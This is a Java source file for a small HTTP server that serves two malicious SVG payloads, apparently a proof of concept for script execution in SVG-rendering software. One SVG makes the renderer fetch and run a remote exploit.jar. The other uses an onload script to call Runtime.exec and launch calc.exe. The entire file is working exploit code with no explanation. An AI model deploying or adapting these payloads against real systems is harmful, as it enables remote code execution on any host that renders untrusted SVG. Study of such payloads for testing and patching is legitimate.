package me.n1ar4;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

public class XmlServer {
    public static void main(String[] args) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(8886), 0);
        server.createContext("/1.xml", new Xml1Handler());
        server.createContext("/2.xml", new Xml2Handler());
        server.setExecutor(null);
        server.start();

        System.out.println("Server started on port 8886");
    }

    static class Xml1Handler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            exchange.getResponseHeaders().set("Content-Type", "application/xml");
            exchange.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
            exchange.sendResponseHeaders(200, 0);
            String xml = "<svg xmlns=\"http://www.w3.org/2000/svg\" " +
                    "xmlns:xlink=\"http://www.w3.org/1999/xlink\" " +
                    "version=\"1.0\"> <script type=\"application/java-archive\" " +
                    "xlink:href=\"http://localhost:8887/exploit.jar\"/> " +
                    "<text>Static text ...</text> </svg>";
            OutputStream responseBody = exchange.getResponseBody();
            responseBody.write(xml.getBytes());
            responseBody.close();
        }
    }
    static class Xml2Handler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            exchange.getResponseHeaders().set("Content-Type", "application/xml");
            exchange.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
            exchange.sendResponseHeaders(200, 0);
            String xml = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" " +
                    "height=\"100\"> <circle cx=\"50\" cy=\"50\" r=\"50\" fill=\"green\" " +
                    "onload=\"showFrame()\"/> <script type=\"text/ecmascript\"> " +
                    "importPackage(Packages.java.lang); function showFrame() { " +
                    "Runtime.getRuntime().exec(\"calc.exe\"); } </script> </svg>";
            OutputStream responseBody = exchange.getResponseBody();
            responseBody.write(xml.getBytes());
            responseBody.close();
        }
    }
}
